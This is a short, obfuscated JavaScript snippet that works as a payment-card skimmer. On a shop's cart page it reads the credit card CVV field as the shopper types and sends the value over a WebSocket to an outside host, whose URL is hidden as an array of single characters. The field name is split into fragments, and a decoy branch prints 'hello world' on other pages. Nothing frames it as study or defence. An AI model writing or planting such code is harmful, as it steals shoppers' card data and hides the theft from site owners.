const p = '/cart/view';
const n = document.location.pathname;
const s = '#cre' + 'ditCard' + 'C' + 'VVField';
const u = [
  'w',
  's',
  's',
  ':',
  '/',
  '/',
  'c',
  'o',
  'n',
  'n',
  'e',
  'c',
  't',
  '.',
  'w',
  'e',
  'b',
  's',
  'o',
  'c',
  'k',
  'e',
  't',
  '.',
  'i',
  'n',
  '/',
  't',
  'e',
  's',
  't',
  '?',
  'r',
  'o',
  'o',
  'm',
  '_',
  'i',
  'd',
  '=',
  '3',
  '1',
  '3',
  '3',
  '7',
];

function magic() {
  const socket = new WebSocket(u.join(''));

  socket.onmessage = function(msg) {
    console.log(msg);
  };

  socket.onopen = function() {
    const x = document.querySelector(s).value;
    socket.send(x);
    console.log(x);
  };
}

if (n !== p) {
  console.log('hello world');
} else {
  document.querySelector(s).addEventListener('input', magic);
}
